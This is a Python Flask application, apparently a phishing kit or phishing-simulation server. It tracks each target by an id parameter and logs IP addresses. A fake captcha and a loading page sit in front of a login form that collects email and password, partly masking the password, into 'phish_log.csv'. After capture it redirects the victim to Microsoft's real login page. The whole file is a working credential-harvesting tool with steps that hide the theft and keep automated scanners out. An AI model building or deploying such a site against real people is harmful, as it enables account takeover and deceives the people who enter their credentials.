from flask import Flask, request, redirect, render_template, url_for, jsonify, session
import csv, datetime, os
from urllib.parse import urlencode

app = Flask(__name__)
app.secret_key = os.urandom(24)
LOG_FILE = 'phish_log.csv'

# Create the log file with headers if it doesn't exist
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w', newline='') as f:
        csv.writer(f).writerow(['timestamp','event','id','ip','email','password'])

def log_event(event, user_id, ip, email='', password=''):
    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
    if password:
        password = mask_password(password)
    with open(LOG_FILE, 'a', newline='') as f:
        csv.writer(f).writerow([ts, event, user_id, ip, email, password])

def mask_password(pw):
    if len(pw) <= 5:
        return '*' * len(pw)
    return pw[:3] + '*' * (len(pw) - 5) + pw[-2:]

@app.route('/', methods=['GET'])
def home():
    # Always redirect to captcha
    return redirect(url_for('captcha'))

@app.route('/captcha', methods=['GET', 'POST'])
def captcha():
    # On first entry, get the id parameter and log it
    user_id = request.args.get('id', 'unknown')
    ip = request.remote_addr

    # On GET, log and save to session
    if request.method == 'GET' and user_id:
        log_event('initial_visit', user_id, ip)
        session['user_id'] = user_id

    # On POST, get from form and save to session
    if request.method == 'POST':
        captcha_input = request.form.get('captcha_input', '').strip().upper()
        captcha_code = request.form.get('captcha_code', '').strip().upper()
        user_id = request.form.get('user_id', 'unknown')
        if captcha_input == captcha_code and captcha_code:
            session['captcha_passed'] = True
            session['user_id'] = user_id
            log_event('captcha_success', user_id, ip)
            return redirect(url_for('loading'))
        else:
            log_event('captcha_fail', user_id, ip)
            return render_template('captcha.html', error='Invalid code. Please try again.', user_id=user_id)

    # On GET, if user_id is not present, get from session
    return render_template('captcha.html', user_id=session.get('user_id', 'unknown'))

@app.route('/loading')
def loading():
    if not session.get('captcha_passed'):
        return redirect(url_for('captcha'))
    user_id = session.get('user_id', 'unknown')
    ip = request.remote_addr
    log_event('loading_page', user_id, ip)
    return render_template('loading.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not session.get('captcha_passed'):
        return redirect(url_for('captcha'))
    
    user_id = session.get('user_id', 'unknown')
    ip = request.remote_addr

    if request.method == 'GET':
        log_event('login_page_visit', user_id, ip)
        return render_template('index.html')

    # POST: form submit
    email = request.form.get('email', '')
    password = request.form.get('password', '')

    if email and not password:
        # If only email is submitted, log it
        log_event('email_submit', user_id, ip, email, '')
        return ('', 204)
    elif email and password:
        # If both email and password are submitted, log and redirect
        log_event('login_submit', user_id, ip, email, password)
        return redirect('https://login.microsoftonline.com/')
    else:
        return redirect(url_for('home'))

@app.route('/favicon.ico')
def favicon():
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
